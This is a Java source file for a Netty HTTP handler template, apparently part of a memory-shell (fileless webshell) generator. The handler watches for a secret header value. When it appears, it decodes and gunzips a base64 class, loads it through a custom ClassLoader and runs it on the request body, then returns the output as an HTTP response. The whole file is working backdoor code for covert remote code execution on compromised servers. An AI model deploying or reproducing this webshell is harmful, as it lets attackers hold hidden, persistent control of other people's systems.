package org.leo.jmg.mem.shell.http;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.FullHttpRequest;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;

@ChannelHandler.Sharable
public class LeoNettyHandlerTpl extends ChannelDuplexHandler {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public void channelRead(ChannelHandlerContext context, Object message) throws Exception {
        if (!(message instanceof FullHttpRequest)) {
            context.fireChannelRead(message);
            return;
        }
        FullHttpRequest request = (FullHttpRequest) message;
        String header = request.headers().get(headerName);
        if (header == null || !header.contains(headerValue)) {
            context.fireChannelRead(message);
            return;
        }
        byte[] body = new byte[request.content().readableBytes()];
        request.content().getBytes(request.content().readerIndex(), body);
        byte[] response;
        try {
            response = invokeCore(body);
        } catch (Throwable ignored) {
            response = new byte[0];
        }
        ByteBuf content = Unpooled.wrappedBuffer(response);
        FullHttpResponse httpResponse = new DefaultFullHttpResponse(
                HttpVersion.HTTP_1_1, HttpResponseStatus.valueOf(respCode), content);
        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());
        context.writeAndFlush(httpResponse);
    }

    private byte[] invokeCore(byte[] body) throws Exception {
        java.io.ByteArrayOutputStream exchange = new java.io.ByteArrayOutputStream();
        exchange.write(body);
        ClassLoader loader = getClass().getClassLoader();
        Class core;
        try {
            core = Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            java.io.ByteArrayOutputStream output = new java.io.ByteArrayOutputStream();
            java.util.zip.GZIPInputStream gzip = new java.util.zip.GZIPInputStream(
                    new java.io.ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            core = new Loader(loader).define(output.toByteArray());
        }
        try {
            ((java.lang.reflect.InvocationHandler) core.newInstance()).invoke(null, null, new Object[]{exchange});
        } catch (Throwable e) {
            throw new IllegalStateException("Core invocation failed", e);
        }
        return exchange.toByteArray();
    }

    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }

    private static class Loader extends ClassLoader {
        Loader(ClassLoader parent) { super(parent); }
        Class define(byte[] bytes) { return defineClass(null, bytes, 0, bytes.length); }
    }
}
